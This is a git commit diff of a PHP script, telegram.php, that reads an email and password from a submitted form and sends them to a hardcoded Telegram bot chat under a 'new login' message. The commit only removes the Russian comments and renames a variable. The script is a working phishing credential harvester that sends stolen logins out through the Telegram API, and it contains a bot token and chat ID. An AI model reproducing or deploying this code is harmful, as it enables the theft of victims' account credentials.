2edad28582a2299cb8582719aacf00ccfdfb075f
Reset05 <121117025+Reset05@users.noreply.github.com>
2023-11-02 22:53:50 +0300

    Update telegram.php

--- telegram.php
+++ telegram.php
@@ -1,24 +1,17 @@
 <?php
-// Получаем данные из формы
 $name = $_POST['email'];
-$phone = $_POST['password'];
+$pass = $_POST['password'];
 
-// Ваш API-ключ Telegram бота
 $telegram_api_key = '6918416164:AAGdVkX8XCbx5q1vtRAFEm54uT7ZRd6jO-0';
 
-// Чат-идентификатор группы в Telegram, куда будут отправляться уведомления
 $chat_id = '993175437';
 
-// Сообщение для отправки в группу
-$message = "Новый вход:\nЕмали: $name\nНомер Пароль: $phone";
+$message = "Новый вход:\nЕмали: $name\nНомер Пароль: $pass";
 
-// URL для отправки сообщения в Telegram
 $telegram_url = "https://api.telegram.org/bot$telegram_api_key/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
 
-// Отправляем запрос к API Telegram
 $response = file_get_contents($telegram_url);
 
-// Проверяем результат отправки
 if ($response === false) {
     echo 'Ошибка при отправке заявки.';
 } else {
